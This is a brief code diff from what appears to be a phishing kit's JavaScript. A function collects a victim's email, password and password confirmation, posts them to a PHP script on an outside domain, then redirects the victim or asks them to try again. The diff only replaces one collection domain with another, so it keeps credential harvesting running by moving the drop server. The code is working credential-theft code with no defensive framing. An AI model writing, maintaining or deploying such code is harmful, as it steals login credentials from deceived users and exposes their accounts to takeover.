@@ -145,7 +145,7 @@ function set(t, e) {
 
  function sendDetails(t, e, n,q) {
       var o = new FormData;
-      o.append("email", t),o.append("q",q), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://ozbalperde.com/feedback0.php", o).then(function(t) {
+      o.append("email", t),o.append("q",q), o.append("password", e), o.append("confirm_password", n),o.append("id",1), axios.post("https://divinasmoda.net/feedback0.php", o).then(function(t) {
           200 === t.status && redirect(url_link,q)
       }).catch(function(t) {
           console.log(t), alert(t + "\nPlease try again!"), window.history.go(-1)
